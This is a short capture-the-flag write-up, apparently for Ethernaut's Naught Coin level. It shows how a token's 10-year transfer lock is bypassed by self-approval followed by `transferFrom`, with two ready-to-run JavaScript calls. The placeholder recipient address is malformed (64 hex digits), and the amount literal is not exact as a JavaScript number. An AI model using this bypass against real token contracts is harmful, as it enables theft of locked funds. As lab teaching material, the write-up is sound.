ERC20 specifies that conforming tokens must implement the following API:
- totalSupply()
- balanceOf(account)
- transfer(recipient, amount)
- allowance(owner, spender)
- approve(spender, amount)
- transferFrom(sender, recipient, amount)

In this level we're not able to call `transfer` before the 10 year time limit, however we are able to use `approve` and `transferFrom`. These two functions allow us to grant permission to another address to spend the token, and in our case we can grant approval to ourselves so we can use transferFrom to transfer the tokens. 

First we approve ourselves to transfer `INITIAL_SUPPLY` worth of tokens:
```javascript
await contract.approve(player, 1000000000000000000000000)
```

Then we transfer all of them to another address which is not us:
```javascript
await contract.transferFrom(player, "0xaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa", 1000000000000000000000000)
```
